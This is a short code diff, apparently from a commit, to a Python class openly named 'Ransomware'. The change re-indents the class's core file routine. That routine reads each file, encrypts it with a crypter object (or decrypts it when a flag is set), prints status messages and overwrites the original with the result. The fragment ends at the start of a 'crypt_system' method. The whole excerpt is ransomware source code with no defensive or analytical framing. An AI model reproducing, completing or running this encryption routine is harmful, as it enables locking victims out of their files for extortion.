@@ -88,19 +88,19 @@ class Ransomware:
 		#Encrypt/Decrypt Files
 		with open(file_path,'rb') as f : 
 			data=f.read() # read Data from file
-		print(f"[+] Crypter Object In Use : {self.crypter}")
-		# Encrypt Data
-		if not encrypted :
-			_data=self.crypter.encrypt(data)
-			print(f"{file_path} Has Been Encrypted ")
+			print(f"[+] Crypter Object In Use : {self.crypter}")
+			# Encrypt Data
+			if not encrypted :
+				_data=self.crypter.encrypt(data)
+				print(f"{file_path} Has Been Encrypted ")
 
-		# Decrypt Data
-		else :
-			_data=self.crypter.decrypt(data)
-			print(f"{file_path} Has Been Decrypted ")
+			# Decrypt Data
+			else :
+				_data=self.crypter.decrypt(data)
+				print(f"{file_path} Has Been Decrypted ")
 
-		with open(file_path,'wb') as fp :
-			fp.write(_data)
+			with open(file_path,'wb') as fp :
+				fp.write(_data)
 
 	def crypt_system(self,encrypted=False):
 
